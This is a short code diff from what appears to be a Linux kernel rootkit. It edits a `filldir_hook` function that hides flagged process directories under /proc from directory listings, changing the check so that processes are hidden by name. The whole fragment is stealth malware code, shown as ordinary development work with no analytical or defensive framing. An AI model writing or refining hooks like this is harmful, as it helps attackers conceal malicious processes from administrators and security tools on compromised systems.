@@ -37,7 +37,7 @@ static asmlinkage bool filldir_hook(struct dir_context *ctx, const char *name, i
     // Check if we're in /proc directory and hiding processes
     if (d_type == DT_DIR && is_numeric_string(name, namlen)) {
         pid_t pid = string_to_pid(name, namlen);
-        if (pid > 0 && is_pid_hidden(pid)) {
+        if (pid > 0 && is_pid_hidden_by_name(pid)) {
             return 0; // Hide this process directory
         }
     }
